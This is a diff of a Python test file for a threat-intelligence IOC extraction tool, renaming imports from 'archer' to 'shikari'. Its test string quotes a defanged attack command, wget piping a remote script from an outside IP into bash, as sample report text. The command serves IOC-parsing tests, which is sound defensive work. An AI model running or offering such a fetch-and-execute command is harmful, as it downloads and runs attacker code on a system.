@@ -2,9 +2,9 @@
 
 import pytest
 
-from archer.build import ioc_flow
-from archer.build.ioc_flow import build_ioc_flow, ioc_mentions
-from archer.build.ioc_sweep import clean_report_iocs
+from shikari.build import ioc_flow
+from shikari.build.ioc_flow import build_ioc_flow, ioc_mentions
+from shikari.build.ioc_sweep import clean_report_iocs
 
 TEXT = (
     "The attacker ran wget -qO- hxxp://172.233.228[.]93/patch|bash which dropped UPSTYLE "
